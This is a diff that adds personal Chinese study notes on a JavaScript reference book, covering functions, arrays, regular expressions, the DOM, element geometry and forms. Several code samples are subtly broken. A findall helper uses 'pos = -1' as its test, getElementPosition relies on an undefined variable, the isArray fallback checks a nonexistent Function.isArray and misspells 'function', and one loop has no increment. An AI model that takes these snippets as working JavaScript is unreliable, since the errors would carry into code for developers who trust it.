+		6. Function()构造函数
+			每次调用，都解析函数体，并创建新的函数对象
+			创建的函数不使用词法作用域，在顶层函数(全局作用域)执行
+			可认为是全局作用域中执行的eval(),
+			eval()可在自己的私有作用域定义新变量和函数
+
+		7.可调用的对象
+			IE8 -  浏览器实现了客户端方法Window.alert() Document.getElementById(),使用了可调用的宿主对象而非Function对象。
+
+			RegExp。
+			Object.prototype.toString.call()判断是否为函数
+
+	8.8 函数式编程
+		可在js中应用函数式编程技术。
+		1.用函数处理数组
+		2.high-order function
+			操作函数的函数
+
+		3.不完全函数
+			bind(),将函数"绑定至"对象，并传入一部分参数，传入的实参都是放在传入原始函数的 实参列表开始位置。
+
+			编程技巧
+
+			外部函数的arguments、保存出函数的arguments。
+
+		4.记忆
+			缓存技巧
+			function jc(n) {
+				if(isFinite(n) && n>0 && n==Math.round(n)){
+					if(!(n in jc))
+						jc[n] = n * jc(n-1);
+				return jc[n];
+				}else if(n == 0){
+					return jc[0];
+				}
+				else return NaN;
+			}
+			jc[0] = 1;
+			jc[1] = 1;
+			记忆，牺牲算法的空间复杂度，换取更优的时间复杂度。客户端js中，时间复杂度往往成为瓶颈。
+
+			期望使用实现了记忆功能的递归函数。
+
+
+chap7 数组
+	值的有序集合。
+	js数组索引是 基于0的32位数值，最大索引 2^32-2。
+
+	稀疏数组的length。
+
+	7.1 创建数组
+		省略的元素，赋予undefined值。
+
+	7.2 数组元素的读写
+		[]，访问数组中的一个元素。括号内"返回非负整数值的任意表达式"；
+
+		数组特别之处，使用小于2^32的非负整数作为属性名时，数组自动维护其length属性。
+		数组的索引和对象的属性名。
+			为数组创建属性，使用的是数组的索引。0---2^32-2的整数。数组的特殊行为，根据需要更新length 属性值。
+
+		事实上数组索引仅仅是对象属性名的一种特殊类型。
+			这意味着js数组没有越界错误的概念。
+
+	7.3 稀疏数组
+		包含从0 开始的不连续索引的数组。
+		数组直接量中省略值不会创建稀疏数组，省略元素值为undefined。和 元素根本不存在有区别
+		in 来判断。 for/in 循环也不同 no
+
+	7.4 数组长度
+		长度永远大于元素索引。
+		--->特殊行为，i>= length,length = ++i ;
+			设置length属性值n < length，索引值 >= n的元素将删除。
+
+		es5中，
+			Object.defineProperty(arr,"length",{writable: false});
+			或不可配置。
+
+	7.5 数组元素添加、删除
+		delete ，不修改数组length属性。和 undefined不同。
+		数组成稀疏数组。
+
+		splice()插入，删除，替换数组元素。会根据需要修改length属性，并移动元素。
+
+	7.6 遍历
+		nested循环或其他新能非常重要的上下文中，基本的for 数组遍历，应优化。
+
+		使用数组元素前应检测
+			排除null undefined 不存在的元素; !arr[i]
+			跳过 undefined 和不存在的元素 arr[i]===undefined
+			跳过不存在的元素   i in arr
+		for/in 处理稀疏数组 不存在的索引不会遍历到。
+			;for(var i in a){if (String(Math.floor(Math.abs(Number(i))))) ! == i) continue;}
+		for/in 枚举继承的属性名。
+
+		若算法依赖遍历顺序，不使用for/in。es5规范允许for/in循环以不同顺序遍历对象的属性。
+
+		forEach(function(x){};)，数组元素按索引的顺序依次传递给定义的一个函数。
+
+
+	7.7 多维数组
+		js用数组的数组来近似。
+
+	7.8 es3的数组方法
+		Array.join()将数组中所有元素都转换为字符串，并连接，返回字符串结果。
+		String.split()的逆向操作。
+
+		Array.reverse()采用了替换，即不创建新的数组。
+
+		sort()， 将元素排序后返回排序后的数组。undefined到尾部。
+			默认按字母表顺序排序。
+			传入参数，a b ，a 在前，返回负...
+			不区分大小写排序，先转化小写。
+
+		concat() 创建并返回一个新数组。
+			不递归扁平化数组的数组[1,2,[3,4]]，不修改调用数组。
+
+		slice()
+			返回指定片断，不修改数组。
+
+		splice() 
+			修改数组
+			前两参，指定需要删除的数组元素。之后任意个数参数指定插入到数组中的元素。
+			起始点，按索引。 游标的位置(看该位置之前有几个元素)。插入数组本身。
+
+		push() pop()
+			将数组当作栈来使用。
+			push()返回数组的长度。pop()删除数组的最后一个元素，减小数组长度并返回删除的值。修改并替换原始数组。
+		unshift() shift()
+			类似splice() 插入时，不对数组做处理。
+
+	7.9 es5中的新方法
+		遍历、映射、过滤、检测、简化、搜索数组。
+
+		新方法概述
+			大多数方法，第一个参数接收一个函数，且对数组每个元素(或一些元素)调用一次该元素。
+			稀疏数组，
+			调用提供的函数使用三个参数：
+				数组元素，元素索引，本身。
+				通常只需第一个参数。
+			第二个参数
+				调用的函数当作其方法。
+			都不修改它们调用的原始数组。传递给方法的函数可修改。
+
+		1.forEach()
+			没有for循环 中的break语句。
+			不能在元素都传递给调用函数前，提前终止，
+				使用try/catch/抛出异常。
+
+		2.map()
+			返回一个新数组，包含了该函数的返回值。
+			稀疏数组，也有相同的缺失元素。
+
+		3.filter()
+			返回的数组元素是调用的数组的一个子集。传递的函数进行逻辑判定：return true/false;
+			符合判定函数的元素，作为子集的成员。
+			稀疏数组，跳过缺少的元素。返回数组总是稠密的。
+
+			压缩稀疏数组的空缺--var dense = sparse.filter(function(){return true;});
+			a.a.filter(function(x){return x !== undefined && x != null;});
+
+		4.every() 和 some()
+			数组的逻辑判定：对数组元素应用指定的函数进行判定。
+			every() 数学中的量词。
+			some()。
+			当方法确认返回值就停止遍历数组元素。
+			空数组上调用，every()返回true。
+		5.reduce()  reduceRight()
+			化简函数，初始值
+			每次执行，第一个参数使用上次化简结果(数组元素)/初始值,第二个是数组元素。
+				var a1= [1,2,3,4,5];
+				var sum = a1.reduce(function (x,y) {
+					console.log('------' +x + '-->' + y);
+					return x + y;
+				});
+
+			空数组上，不带初始值参数调用reduce()，类型错误异常。空数组/一个元素的数组，初始值，reduce()只简单返回这一个值，不调用函数。
+
+			接收可选的第二参数， 指定化简函数调用时，this的值。若让化简函数作为特殊对象的方法调用，参看Function.bind()。
+
+			every(),some() 是一种类型的数组化简操作。
+
+			计算对象的并集
+				6-2中union函数，计算两个对象的并集。工作原理和化简函数一样。
+				一般化，使用reduce将其一般化。
+
+		6. indexOf() lastIndexOf()
+			参数：
+				搜索值，指定开始搜索的索引。
+			function findall(a,x){
+				var ret =[],
+					len = a.length,
+					pos = 0;
+				while(pos < len){
+					pos = a.indexOf(x,pos);
+					if(pos = -1) break;
+					ret.push(pos);
+					pos = pos+ 1;
+				}
+				return ret;
+			}
+			字符串的方法和数组类似。
+	7.10数组类型
+	es5中
+		Array.isArray()
+		es5之前区分数组，非数组对象。
+			instanceof 用于简单情形。
+				多个窗口，都有自己的js环境，有自己的全局对象。
+			解决：检查对象的类属性。
+			var isArray = Function.isArray || fuction(o){
+				return typeof o === "object" &&
+	*****	获取对象类属性	Object.prototype.toString.call(o) === "[object Array]";
+			};
+
+	7.11类数组对象
+		js数组的一些特性：
+			length-->2个
+			从Array.prototype中继承方法，
+			类属性是 "Array"
+		定义数组的本质特性：
+			有一个数值 length属性，和对象非负整数属性的对象。
+
+		类数组对象，直接调用数组方法，或期望length属性有什么特殊行为。
+		很多数组算法针对 类数组对象工作的很好。
+
+		判断是否是类数组对象
+
+			function isArrayLike(obj){
+				if(obj &&
+					typeof obj === "object" &&
+					isFinite(obj.length) &&
+					obj.length >= 0 &&
+					obj.length === Math.floor(obj.length) &&
+					obj.length < Math.pow(2,32))
+					return true;
+				else 
+					return false;
+			}
+
+		es3的toString() toLocalString() 之外的方法也通用，concat() 可用在类数组对象上，但没将对象扩充进返回的数组
+		es5，所有数组方法通用。
+
+		Firefox直接将数组方法的版本 在 Array构造函数上定义为函数。
+
+	****当用在类数组对象上， 数组方法的静态函数版本很有用。
+
+		Array.join = Array.join || function(a,sep) {
+			return Array.prototype.join.call(a,sep);
+		}
+
+	7.12作为数组的字符串(不可变值)
+		es5中，字符串的行为类似于只读的数组。
+			意味着通用的数组方法可应用在字符串上。
+		可索引的字符串 用 [] 代替了　　charAt()调用。
+
+10	正则表达式的模式匹配
+	正则表达式，描述字符模式的对象。
+
+10.1正则表达式的定义
+
+	es3
+	正则表达式直接量在执行时转换为RegExp对象，同一段代码表示的直接量每次运算返回同一个对象。
+	es5
+	同一段代码所表示的正则表达式直接量，每次运算返回新对象。
+
+	正则表达式的模式规则由一个字符序列组成。
+
+	1.直接量字符
+		\t \n \v \f \r
+		十六进制的指定的拉丁字符  \xnn
+		十六进制数指定的Unicode字符 \uxxxx
+
+		标点符号的特殊含义
+			直接量，
+			字面量
+			转移\
+	2.字符类
+		[直接量] 组成了字符类。
+		- 表示字符范围
+		\s 空格 制表等其他unicode空白符
+		\S 补集
+		\b 用在字符类中，特例[\b] 退格直接量，表示一个退格符。
+
+	3.重复
+		正则表达式中某元素的重复出现次数
+		在正则模式后 跟随用以指定字符重复的标记。有的常用，做出了特殊字符。
+		{n,m} {n,} {n} ?==={0,1} 
+		+==={1,} * === {0,}
+
+		? 可选的
+		*        什么都不匹配
+
+		非贪婪的重复
+			?
+
+		正则表达式的模式匹配
+			寻找字符串中第一个可能匹配的位置。
+
+		/a+?b/   "aaab"
+		/a+b/     "aaab"   俩结果相同。
+
+
+	4.选择、 分组和引用
+		指定选择项   |
+			尝试匹配次序，从左至右，直到发现匹配项
+
+		() 组合成表达式
+			完整的模式中定义子模式。
+			同一正则表达式的后部引用前面的子表达式 \1...
+			子表达式的位置，参与 计数的左括号的位置。
+
+		引用：
+			不是对子表达式模式的引用， 指 与该模式匹配的文本的引用。
+			\1 引用了 与( 。。。)匹配的文本。
+		正则不允许用双引号括起 的内容里有单引号。反之同样。
+
+		(?:...)只组合,把项为一个单元， 不记忆与该组想匹配的字符。 该形式的分组不编码。
+
+	5.指定匹配位置
+		锚字符
+		\b \B
+		这些指定  匹配发生的 合法位置。
+		正则表达式的锚。
+
+		(?=   )之间的表达式只用于指定一个位置，是零宽的。=== 零宽断言。
+		(?! ) 指定接下来的字符都不必匹配。
+
+	6.修饰符
+		g，全局匹配，找出所有。
+
+
+10.2用于模式匹配的String 方法
+	String对象，的用以执行正则表达式模式匹配 和检索替换操作  的方法。
+
+	正则表达式相关的属性和方法
+
+	search(//gim)
+		返回 第一个与之匹配的子串的起始位置。
+		不是正则表达式，则将其通过 RegExp构造函数将其转换为 正则表达式。
+		忽略全局 g。
+
+	replace(reg,)
+		g,源字符串中所有与 reg 模式匹配的子串 都将替换。
+
+		text.replace(/javascript/gi, "JavaScript");
+		replace()将直接搜索字符串，不进行转换。
+
+		替换字符串中出现了$和数字，将与指定的子表达式
+
+	match(reg/ RegExp(reg))
+		返回一个由匹配结果组成的数组。g
+		无 g, 数组第一个元素是匹配的字符串，余下的元素是 子表达式。
+			若match() ,返回 arr, arr[0]存放的完整匹配， arr[1] 存放的是 与第1个子表达式 相匹配的子串.
+
+			和replace()保持了一致， arr[n] 存放了 $n的内容
+
+			和 reg.exec(str) ，返回的数组有两个属性 index, input。
+
+	split()
+		"1, 2, 3, 4, 5".split(/\s*,\s*/);
+			返回["1","2","3","4","5"];
+
+
+10.3RegExp对象。
+	构造函数，参数是字符串
+	程序运行时创建正则表达式。如待检索的字符串由用户输入。
+		eval() 不推荐使用。
+
+	属性：
+		source,
+			只读的str, 包含正则表达式的文本
+		global,ignoreCase,multiline
+			只读布尔值
+		lastIndex,
+			可读写整数，表达式有g修饰，属性存储了整个字符串下一次检索的开始位置。
+
+	exec()
+		没找到任何匹配，返回null
+		返回一个数组，和 match(/reg/)一致。
+			arr[0] 包含的是 与正则表达式相匹配的字符串。
+
+		index包含 了发生匹配的字符 位置
+		input 引用的是正在检索的字符串。
+		返回数组，都一样。
+			lastIndex， 在字符串找到最后一个匹配项后， 在使用RegExp对象开始 新的查找之前，都应重置为0.
+
+	test()
+		和exec()返回结果的等价性。
+		从 lastIndex指定的位置处开始检索字符串，找到匹配结果，重设lastIndex。
+
+		---可使用test()来遍历字符串。
+
+		String的方法只是将lastIndex属性值 设为0。
+		一个带有g 的表达式，对多个字符串执行exec()或test()
+			在每个字符串中找出所有匹配，以便lastIndex自动重置
+		要么显式将lastIndex = 0；
+
+		es5中，直接量每次计算都创建新的 RegExp对象。
+
+
+11  js的扩展
+	js中变量的块级作用域支持
+		version 1.7+ 支持let。
+	Spidermonkey  Firefox基于的猴系列 引擎
+
+	let关键字
+		作为变量声明
+		for | for/in 循环中，作为var 的替代方案
+		在语句块中定义一个新变量，并显式指定它的作用域
+		定义一个在表达式内部作用域的变量，变量只在表达式可用。
+
+	let x = 1, y = 2;
+	let (x = x + 1, y = x + 2) {
+		console.log(x,y);
+	}; // 语句里的变量和初始化表达式都放在 ()内，之后是语句块。
+	console.log(x,y)
+
+
+	3.解构赋值
+		destructuring assignment。
+
+
+
+窗口中子窗体的引用
+	window对象的 frames属性，引用自身包含的窗口或窗体 的子窗体的引用 。
+
+
+
+chap15 脚本化文档
+	DOM概览
+		DOM结构
+
+		DocumentFragment类在 实际文档并不存在的一种节点：代表一系列没有常规父节点的节点。
+
+		Documnet类型代表一个HTML，XML文档
+		Element类型代表文档中的一个元素
+
+		HTMLDocument和 HTMLElement子类只是针对于HTML文档和元素。
+		Node
+			Document
+				HTMLDocument
+			CharacterData 
+				Text
+				Comment
+			Element
+				HTMLElement
+			Attr
+
+15.2选取文档元素
+	客户端js程序运行时，要操作文档元素。
+	用全局变量document来引用Document对象。
+
+	getElementsByName() 定义在HTMLDocument类中。
+		显式调用该方法查找。
+
+	getElementsByTagName()
+		历史原因，HTMLDocument类定义了快捷属性访问各种各样节点：
+			1.images froms links 
+			embeds/plugins 属性  anchors，指代有name属性的a
+			h5中的scripts  
+				这些属性指代HTMLCollection对象
+			2.
+				指代特殊的单个元素
+				document.body, document.head
+		Document类的 documentElement属性指代文档根严肃。
+
+		NodeList，HTMLCollection对象不是 历史文档状态的一个静态快照。实时的。
+
+	通过css选择器选取
+		querySelectorAll(),
+		返回 不实时的NodeList 对象，包含在调用时刻选择器所匹配的元素，不更新后续文档的变化。
+		querySelector()
+
+		jq库使用基于CSS 选择器的查询作为它的核心编程范式。
+		jq的CSS选择器匹配代码已作为独立标准库提出发布了，命名为Sizzle。
+	document.all[]
+		引入时是革命性的。
+
+*****************
+	元素id 作为全局变量的隐式应用是web浏览器演化过程的遗留。主要是出于已有web页面后向兼容性的考虑。
+		name属性，有该名称的隐式全局变量会引用一个类数组对象，该类数组对象的元素，是所有叫这个的元素。
+		特例：
+			有name或id属性的iframe元素，
+		通过window 对象的属性引用 的iframe指窗体中的window对象。---可用窗体的名字 f1,代替 frames.f1。 h5规范指出frames属性是自引用sele-referential 的属性，像window，self。window对象可看作是窗体组成的数组。
+********************
+
+
+15.3文档结构和遍历
+	1.作为节点树的文档
+	parentNode #document null
+	childNodes  只读类数组对象 NodeList
+	previousSibling nextSibling 将节点以双向链表的形式连接。
+	nodeType
+	9 1 3 8 11
+	nodeValue 3,8节点的文本内容
+	nodeName   元素标签名大写形式。
+	2.元素树。
+	自定义Element的方法
+
+
+15.4属性
+	有的HTML属性在js中是保留字，一般在属性名前加html
+		for -----> htmlFor
+		class ------> className
+
+
+	2.获取和设置非标准HTML属性
+		Elment类型定义了 getAttribute() 和setAttribute()
+		hasAttribute() removeAttribute()
+
+	3.数据集属性
+		h5。 h5文档中 "data-" 为前缀的属性名都合法， 不会对元素的表现产生影响， 定义了标准的，附加额外数据的方法，，不是在文档合法性上让步。
+		h5在Element对象上定义了 dataset属性。
+			指代一个对象，各个属性对应去掉前缀的 data-属性。
+
+		火花线sparkline
+
+		var sparklines = document.getElementByClassName("sparkline");
+		for(var i = 0 ; i < sparklines.length; i++){
+			var dataset = sparklines[i].dataset;
+			var ymin = parseFloat(dataset.ymin);
+			var ymax = parseFloat(dataset.ymax);
+			var data = sparklines[i].textContent.split(" ").map(parseFloat);
+			drawSparkline(sparklines[i], ymin, ymax, data); // 未实现
+		}
+
+		dataset属性 是元素的 data-属性  的实时、双向接口。 设置或删除dataset 的一个属性就等同于设置删除 对应元素 的data-属性。
+
+	4.作为Attr节点的属性。
+		Node的attributes属性。
+		索引attributes 对象时得到的 是Attr对象。
+
+
+
+15.5元素的内容
+	1.作为HTML元素的内容
+		元素上设置 innerHTML 属性调用了web浏览器的解析器，用新字符串内容的 解析展现形式替换 元素当前内容。
+		 innerHTMl += 重复追加将效率低下，因为要序列化，解析
+
+		h5标准化了outerHTML。
+			返回的字符串包含了该元素的标签。
+
+		insertAdjacentHTML(),将任意HTML标记字符串插入到指定的元素 相邻的位置。
+		"beforebegin"..."afterend",标记是方法的第二个参数。
+
+	2.作为纯文本的元素内容
+		插入纯文本(不必转义 < &)。
+		标准方法是 Node.textContent属性。
+
+		textContent属性将指定元素的所有后代 Text节点简单地 串联返回。innerText没指定行为
+		；innerText不返回<script>元素的内容，忽略多余空白，并试图保留表格格式。
+
+		浏览器不显示script 元素内容，且HTMl解析器忽略脚本中的<> *。
+		<script>元素作为应用程序来嵌入任意文本内容。
+		script元素的text的属性。
+
+	3.作为Text节点的元素内容
+		function textContent(e){
+			var child, type, s = "";
+			for(child = e.firstChild; child != null; child = child.nextSibling){
+				type = child.nodeType;
+				if(type === 3 || type === 4){
+					s += child.nodeValue;
+				}else if(type ===1 ){
+					s += textContent(child);
+				}
+			}
+			return s;
+		}
+
+		CharacterData定义了data属性。和nodeValue文本相同
+
+15.6创建、插入和删除节点
+	Document 类型定义了创建 Element和Text对象的方法。
+	Node定义了在节点树中。 插入、删除和替换的方法。
+
+
+	1.创建节点
+		document.createTextNode();
+		document.createComment()
+		createDocumentFragment()方法。
+
+		XML；
+			createElementNS()同时指定命名空间的URI和待创建的Element 标签名。
+		cloneNode()，传递true/false 深浅复制。
+		importNode()
+
+	2.appendChild()
+		insertBefore(a,b)。// insert a before b. 
+			b=== null。行为类似 appendChild()。
+
+		剪切操作。
+
+	3.删除、替换
+		removeChild()
+		replaceChild();
+
+			用文本字符串替换 n节点
+
+		n.parentNode.replaceChild(document.createTextNode("[lalala]"),n);
+
+		innerHTMl 实现outerHTML
+
+	4.使用DocumentFragment
+		作为其他节点的临时容器。是独立的。
+		parentNode总是null。
+		特殊之处：
+			使得一组节点当作一个看。
+
+			如：
+			function reverse(n) {
+				var f = document.createDocumentFragment();
+				// 后向前循环
+				while(n.lastChild){
+					f.appendChild(n.lastChild);
+				}
+
+				n.appendChild(f);
+			}
+
+		使用innerHTML实现 insertAdjacentHTML()
+
+		// 本模块为不支持它的浏览器定义了方法。
+		// 定义了可移植的HTML插入函数，
+		// Insert.before().
+
+
+		var Insert = (function(){
+			if(document.createElement("div").insertAdjacentHTML) {
+				return {
+					before: function(e, h){e.insertAdjacentHTML("beforebegin",h);},
+				};
+			}
+		}());
+
+
+15.8文档和元素的几何形状和滚动
+	文档坐标，视口坐标
+
+		坐标系之间互相转换，需要判定浏览器窗口的滚动条位置
+			Window对象的pageXOffset/pageYOffset。(除了ie8-)
+			scrollLeft/scrollTop。
+		function getScrollOffsets(w){
+			// 使用指定窗口，否则使用当前
+			w = w || window;
+
+			// 
+			if(w.pageXOffset != null)
+				return{
+					x: w.pageXOffset,
+					y: w.pageYOffset
+				};
+
+			// 标准模式下的IE
+			var d = w.document;
+			if(document.compatMode=="CSS1Compat"){
+				return {
+					x: d.documentElement.scrollLeft,
+					y: d.documentElement.scrollTop
+				};
+			}
+
+			// 对怪异模式下的浏览器
+			return {x : d.body.scrollLeft,
+					y : d.body.scrollTop};
+		}
+
+
+		查询窗口的 视口尺寸
+			// 确定文档的哪些部分是当前可见。
+		function getViewportSize(w){
+			w = w || window;
+
+			// 除了 ie8-
+			if(w.innerWidth != null){
+				return {
+					w: w.innerWidth,
+					h: w.innerHeight
+				};
+			}
+
+			// 标准模式下的IE(或任何浏览器)
+			var d = w.document;
+			if(document.compatMode == "CSS1Compat"){
+				return {
+					w: d.documentElement.clientWidth,
+					h: d.documentElement.clientHeight
+				};
+			}
+
+			// 怪异模式下的浏览器
+			return {
+				w: d.body.clientWidth,
+				h: d.body.clientHeight
+			};
+		}
+
+	2.查询元素的几何尺寸
+		getBoundingClientRect().
+			返回元素在视口坐标中的位置。
+			"Client"间接指代，是web浏览器客户端---定义的窗口或视口。指定了返回的矩形的坐标系。
+
+			转化为浏览器窗口滚动后，依然有效的文档坐标。 需+ 滚动偏移量：
+			var box = elem.getBoundingClientRect();
+			var offsets = getScrollOffsets();
+			var x = box.left + offsets.x;
+			var y = box.top + offsets.y;
+
+		计算元素的width,height
+		var w = box.width || (box.right - box.left);
+		var h = box.height || (box.bottom - box.top);
+
+		该方法返回的坐标不包含元素的外边距。
+
+		内联元素上调用。
+			返回边界矩形。
+		查询内联元素每个独立矩形，调用getClientRects()方法来获得只读类数组对象。
+
+		这返回的矩形对象/列表，不实时。调用方法时，文档视觉状态的静态快照。
+
+	3.判定元素在某点
+		elementFromPoint()判断该点上的里外元素。
+		不常用。
+
+	4.滚动
+
+		//获得文档或 视口的高度，
+		var documentHeight = document.documentElement.offsetHeight;
+		var viewportHeight = window.innerHeight;  // 视口  document.documentElement.clientHeight
+		window.scrollTo(0, documentHeight - viewportHeight);  底部。
+
+		希望滚动使文档的某个元素可见。
+			scrollIntoView() 的行为与设置 window.location.hash为 一个命名锚点
+			(<a name="">元素)的名字后，浏览器产生的行为类似。
+
+
+	5.关于元素 尺寸、位置、溢出
+		元素的尺寸
+			offsetWidth,offsetHeight以CSS像素返回它的屏幕尺寸。
+
+		位置
+			文档坐标
+			function getElementPosition(elem){
+				var x = 0,y = 0;
+				while(elem != null){
+					x += e.offsetLeft;
+					y += e.offsetTop;
+					e = e.offsetParent;
+				}
+				return {x : x, y: y};
+			}
+			getBoundingClientRect()视口
+
+********
+对于已定位元素的后代元素，这些属性返回的坐标是相对于祖先元素的。
+每个HTML 元素都有以下属性：
+	offsetWidth/Height offsetLeft/Top offsetParent 指定这些属性相对的父元素。
+
+	clientWidth/Height clientLeft/Top
+
+	scrollWidth/Height scrollLeft/Top
+********
+	client 和 scroll。
+		单个元素，内容区域是视口，实际内容大于视口，考虑滚动条。
+
+	clientWidth/Height 类似offsetWidth/Height。
+		但c 不包含边框大小，只包含内容和内边。
+		若浏览器在内边距和边框之间添加了滚动条，c在其返回值 也不包含滚动条。
+		对于行内元素， 总返回0.
+		特例：
+			在文档的根元素上查询属性，返回值和窗口的innerWidth/Height属性值相等。
+
+		Left/Top返回元素的内边距的外边缘和边框的外边缘之间的水平，垂直距离。== 左，上 的边框宽度。
+		元素有滚动条，Left/top就包含了滚动条的宽度。
+
+	scrollWidth/Height 元素内容区域+ padding（clientWidth/Height） + 任何溢出内容的尺寸。
+		内容正好和内容区匹配没溢出时。
+		=== clientWidth/Height。
+		溢出时，返回值 > client
+
+		scrollLeft/Top指定元素滚动条的位置。
+		---设置该属性，让元素内容滚动。
+		---文档根对象 document.documentElement
+
+	类似jq的客户端类库扩充了位置计算算法。
+
+
+15.9表单
+	服务端程序中，表单必须有个提交按钮，否则没用。
+		服务端程序是基于表单提交动作的，它们按表单大小的块处理数据---这限制了它们的交互性。
+	客户端程序，基于事件的
+		可对单独的表单元素上的事件做出响应---，这使得它们有更好的响应度。
+
+	1.选取表单和表单元素
+
+		document.querySelectorAll('#shipping input[type="radio"]');
+		// id 为 shipping 的表单中的所有单选按钮。
+
+		有name或id的<form>元素，有多种方法选区。name="address"属性的form
+
+			window.address // 隐式的选取
+			document.address  //仅当表单有name属性时可用
+			document.forms.address  //显式访问有name或id 的表单
+			document.forms[n]  // 不可靠： n是表单序号。
+
+		document.forms是HTMLCollection对象。
+
+		明确地选取一个表单元素，可索引表单对象的elements属性
+		document.forms.address.elements[0];
+		document.forms.address.elements.street
+
+
+		一般，指定文档元素 用id属性比name属性好。
+		但 name属性在HTML表单提交中有特殊目的。
+		当用name索引一个 HTMLCollection对象，且包含多元素共享name时，返回类数组对象。
+
+		案例：
+			<form name="shipping">
+				<fieldset>
+				</fieldset>
+			</form>
+			引用单选按钮元素数组。
+				//题干选项
+			var yunshu_methods = document.forms.shipping.elements.method;
+
+			判定用户的选择，遍历元素，检测他们的checked属性。
+
+			var shipping_method; //题干
+			for(var i = 0; i < yunshu_methods){
+				if(yunshu_methods[i].checked){
+					shipping_method = yunshu_methods[i].value;// 遍历出答案
+				}
+			}
+
+
+	2.表单和元素的属性
+		elments[] 数组是Form 对象中"fun"的属性。
+
+		控制表单如何提交data到服务器，并如何显示。
+			action/encoding/ method/ target 属性 ----Form的property
+			直接对应<form>元素的HTML 属性。
+			js能设置属性值。
+
+		js产生前，有专门的提交，重置按钮。
+		js的Form对象支持 submit(),reset()
+
+		多数/所有表单元素都有的属性
+			type:
+				input 标签
+				其他表单元素定义type是为了在于input 类型检测时，互相区别，轻松标识。
+
+			form
+				对包含元素的Form对象的只读引用。
+			name
+			value
+				指定了表单元素包含或代表的值。
+				提交表单时，发送到服务器的字符串。
+				input 表示的按钮，value设定了按钮显示文本。
+				单选，复选的value在表单提交时使用，关联表单元素的额外数据也有用。
+
+
+	3.表单和元素的事件处理程序
+		提交前，调用onsubmit,程序，此时return false，取消提交动作。此时，检查用户输入，避免提交不完整/无效数据到服务端程序。
+		只能单击"提交按钮" 触发。
+		调用submit()不触发 onsubmit处理程序。
+
+		onreset类似。
+
+		用户与表单元素交互时，他们往往触发click，change事件。单选、复选的一个状态标识。
+
+		表单元素在收到键盘的焦点也 触发focus/ blur。
+
+		事件处理程序中
+			this是触发该事件的dom元素的引用。
+			<form>里其他元素，的处理程序，能通过this.form 得到 Form对象的引用。
+			这以为着，某个元素的处理程序能得到表单中name="x"的元素--->  this.form.x 
+
+	4.按钮
+		<input value="x">
+		<button>xxx</button>
+
+		onclick事件所触发动作 可概念化为 "跟随此链接"时，用链接，否则用按钮。
+
+		提交，重置，有相关联默认动作的按钮。
+
+		用提交元素的onclick 处理程序来执行校验，但更常用的是Form本身的onsubmit事件处理程序来校验。
+
+	5.开关按钮
+		复选框，单选元素
+		或称 有2中视觉状态的按钮： 选中/未选。
+
+		checked/ defaultChecked指定了元素第一次加载页面时是否选中
+
+		本身不显示文本，通常和相邻的HTML 文本一起显示。或与 <label>元素相关联。
+
+		设置value改变提交时，发送的字符串。
+
+		因为其他单选按钮状态改变，导致该按钮状态改变时，后者没 change事件。
+
+	6.文本域
+		<input>
+			placeholder
+			type
+				password: 防止背后的人看到
+				file:
+					此时value只读。防止恶意程序欺骗用户上传不想共享的文件。
+		onkeypress/onkeydown的处理程序返回false，防止记录用户按键。
+			如，强制用户输入数字。
+
+	7.选择框和选项元素
+		<select>
+			type="select-multiple"
+				select-one
+				选取n个选项
+
+		由Select元素显示的选项不是开关按钮：它们由<option>定义。Select元素 定义了options属性，包含了option元素的类数组对象。
+
+		选取/取消选取，select元素触发onchange 处理程序。
+
+		select-one 的select元素
+			selectedIndex 指定哪个被选中
+		select-multile
+			遍历options[]的元素，且检索每个option对象的 selected属性值。
+
+
+		option的 text ,显示给用户的文本
+				value，可读写的。
+				当没有表单提交时，value属性可用来保存数据，使用户选取特定选项时使用。
+		options数组的
+			length可截断 option元素数组。
+			0，将移除所有选项。
+			null，移除单个option对象。
+
+		案例：
+			为select元素增加一个新的选项。
+			var zaire = new Option("Zaire", //text属性
+			"zaire", //value
+			false, //defaultSelected
+			false, //selected
+							);
+			var countries = document.address.country // 得到select对象
+			countries.options[countries.options.length] = zaire;
+
+		API很老了。
+		使用新的插入，删除。
+
+15.10 其他文档特性
+	1. Document的属性
+		cookie，允许js程序读
+		domain
+			当web页面之间交互时，相同域名下互相信任的webserver 之间 协作放宽同源安全策略
+		lastModified
+			文档修改时间字符串
+		location
+			和window.location 引用同一个Location 对象
+		referrer
+			若有，表示浏览器导航到 当前链接的上一个文档。
+			和HTTP 的 Referer头 信息的内容相同。
+		title
+		URL
+			文档的url，只读字符串
+			和 location.href 的初始值相同
+			文档中导向到一个新的片段。location.href 发生变化，
+			document.URL 不变。
+
+	2.document.write()
+		结果字符串插入到文档中调用它的脚本元素的位置。脚本执行结束，浏览器解析生成的输出并显示结果字符串。
+
+		只在解析文档时，使用write()方法输出HTML 到当前文档。 因为同步脚本的执行是文档解析流程的一部分。
+
+		???有问题。write()方法在其他窗口或 iframe 中创建整个全新文档(注意同源策略)
+
+		writeln()，在参数的输出之后追加一个换行符
+
+		innerHTML属性和其他DOM技术，
+		某些算法使得它们本身称为更好的流式 I/O API。
+
+	3.查询选取的文本
+		function getSelectedText() {
+			if(window.getSelection) //h5标准API
+			 return window.getSelection().toString();
+			else if(document.selection)  //ie
+			 return document.selection.createRange().text;
+		}
+
+		window.getSelection()返回一个Selecion对象。
+			无法返回表单元素<input><textarea>内部选中的文本。
+			解决:
+				elt.value.substring(elt.selectionStart, elt.selectionEnd);
+		document.selection对象代表了用户的选择。
+			返回文档任意地方选取的文本
+
+		在书签工具中 有用
+			<a href="javascript: varq;
+				if(window.getSelection)
+					q = window.getSelection().toString;
+				else if (document.selection)
+					q = document.selection.createRange().text;
+				void window.open('http://www.baidu.com/' + q);">
+				Look up Selected in baidu
+			</a>
+
+
+	4.可编辑的内容
+		从表单元素的文本字段和文本域元素，用户可输入并编辑纯文本。
+		到浏览器支持简单的HTML编辑功能，博客评论页的富文本编辑器
+		启用编辑功能
+			任何标签的contenteditable属性
+			设置对应元素的js contenteditable 属性，使元素的内容编程可编辑。 bool值
+
+		浏览器可能支持 表单字段，内容可编辑元素的自动拼写检查。spellcheck。 bool值
+
+		Document对象的designMode属性。myiframe.contentDocument.designMode = "on"。
+
+		当前浏览器都支持，实际的可编辑行为时，不太兼容。enter换行，有的则插入 <br />。有的浏览器支持快捷键加粗当前文本。
+
+		浏览器定义的文本编辑命令，大多没键盘快捷键。
+			Document对象的 execCommand()
+			(command, bool, value)。
+			理论上, bool=== true，浏览器提示输入。
+			提高可移植性，应提示用户输入。
+
+			触发的命令不可用，良好的UI应使对应的按钮无效。
+			document.queryCommandSupported(command); // --->bool值
+			queryCommandEnabled();
+			document.queryCommandState('bold');
+
